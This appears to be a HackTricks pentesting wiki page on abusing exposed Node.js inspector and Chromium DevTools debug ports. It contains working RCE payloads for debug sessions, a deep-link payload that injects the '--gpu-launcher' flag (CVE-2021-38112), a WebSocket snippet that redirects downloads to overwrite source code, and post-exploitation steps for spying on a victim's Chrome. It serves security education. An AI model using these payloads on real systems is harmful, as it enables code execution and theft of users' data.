# Node inspector/CEF debug abuse

{#include ../../../../../../home/runner/work/HackTricks-Feed/HackTricks-Feed/src/banners/hacktricks-training.md}

## Basic Information

[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): When started with the `--inspect` switch, a Node.js process listens for a debugging client. By **default**, it will listen at host and port **`127.0.0.1:9229`**. Each process is also assigned a **unique** **UUID**.

Inspector clients must know and specify host address, port, and UUID to connect. A full URL will look something like `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Since the **debugger has full access to the Node.js execution environment**, a malicious actor able to connect to this port may be able to execute arbitrary code on behalf of the Node.js process (**potential privilege escalation**).

There are several ways to start an inspector:

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

When you start an inspected process something like this will appear:

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Processes based on **CEF** (**Chromium Embedded Framework**) like need to use the param: `--remote-debugging-port=9222` to open de **debugger** (the SSRF protections remain very similar). However, they **instead** of granting a **NodeJS** **debug** session will communicate with the browser using the [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), this is an interface to control the browser, but there isn't a direct RCE.

When you start a debugged browser something like this will appear:

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites open in a web-browser can make WebSocket and HTTP requests under the browser security model. An **initial HTTP connection** is necessary to **obtain a unique debugger session id**. The **same-origin-policy** **prevents** websites from being able to make **this HTTP connection**. For additional security against [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifies that the **'Host' headers** for the connection either specify an **IP address** or **`localhost`** or **`localhost6`** precisely.

> [!TIP]
> This **security measures prevents exploiting the inspector** to run code by **just sending a HTTP request** (which could be done exploiting a SSRF vuln).

### Starting inspector in running processes

You can send the **signal SIGUSR1** to a running nodejs process to make it **start the inspector** in the default port. However, note that you need to have enough privileges, so this might grant you **privileged access to information inside the process** but no a direct privilege escalation.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> This is useful in containers because **shutting down the process and starting a new one** with `--inspect` is **not an option** because the **container** will be **killed** with the process.

### Connect to inspector/debugger

To connect to a **Chromium-based browser**, the `chrome://inspect` or `edge://inspect` URLs can be accessed for Chrome or Edge, respectively. By clicking the Configure button, it should be ensured that the **target host and port** are correctly listed. The image shows a Remote Code Execution (RCE) example:

![](<../../images/image (674).png>)

Using the **command line** you can connect to a debugger/inspector with:

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), allows to **find inspectors** running locally and **inject code** into them.

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Note that **NodeJS RCE exploits won't work** if connected to a browser via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (you need to check the API to find interesting things to do with it).

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> If you came here looking how to get [**RCE from a XSS in Electron please check this page.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Some common ways to obtain **RCE** when you can **connect** to a Node **inspector** is using something like (looks that this **won't work in a connection to Chrome DevTools protocol**):

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
In this section I will just list interesting things I find people have used to exploit this protocol.

### Parameter Injection via Deep Links

In the [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security discovered that an application based on CEF **registered a custom UR**I in the system (workspaces://index.html) that received the full URI and then **launched the CEF based applicatio**n with a configuration that was partially constructing from that URI.

It was discovered that the URI parameters where URL decoded and used to launch the CEF basic application, allowing a user to **inject** the flag **`--gpu-launcher`** in the **command line** and execute arbitrary things.

So, a payload like:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Will execute a calc.exe.

### Overwrite Files

Change the folder where **downloaded files are going to be saved** and download a file to **overwrite** frequently used **source code** of the application with your **malicious code**.

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE and exfiltration

According to this post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) it's possible to obtain RCE and exfiltrate internal pages from theriver.

### Post-Exploitation

In a real environment and **after compromising** a user PC that uses Chrome/Chromium based browser you could launch a Chrome process with the **debugging activated and port-forward the debugging port** so you can access it. This way you will be able to **inspect everything the victim does with Chrome and steal sensitive information**.

The stealth way is to **terminate every Chrome process** and then call something like

```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```

## References

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{#include ../../../../../../home/runner/work/HackTricks-Feed/HackTricks-Feed/src/banners/hacktricks-training.md}


